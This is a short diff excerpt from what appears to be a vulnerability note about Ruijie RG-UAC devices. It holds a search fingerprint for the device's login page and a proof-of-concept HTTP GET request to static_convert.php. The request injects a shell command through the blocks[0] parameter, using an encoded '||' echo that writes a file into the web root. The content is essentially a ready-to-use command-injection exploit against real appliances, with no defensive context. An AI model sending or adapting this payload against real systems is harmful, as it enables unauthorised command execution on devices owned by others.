@@ -8,7 +8,7 @@
 title="RG-UAC登录页面"
 ```
 
-## poc
+## POC
 
 ```
 GET /view/IPV6/naborTable/static_convert.php?blocks[0]=||%20%20echo%20'mht666'%20>>%20/var/www/html/mht.txt%0A HTTP/1.1
